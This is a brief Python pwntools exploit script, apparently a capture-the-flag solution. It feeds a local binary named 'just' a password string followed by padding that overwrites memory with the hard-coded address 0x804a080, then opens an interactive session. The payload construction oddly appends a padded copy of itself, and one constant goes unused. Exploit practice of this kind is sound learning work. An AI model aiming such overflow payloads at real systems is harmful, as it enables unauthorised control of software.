from pwn import *

elf = context.binary = ELF("./just")

p = process()

PUTS_OFFSET = 0x20

p.recvline()


payload = flat([
    b"PASSW0RD\0",
    b"A" * (20 - len(b"PASSW0RD\0")),
    0x804a080
])
payload += payload.ljust(32,b"A")
p.sendline(payload)
p.interactive()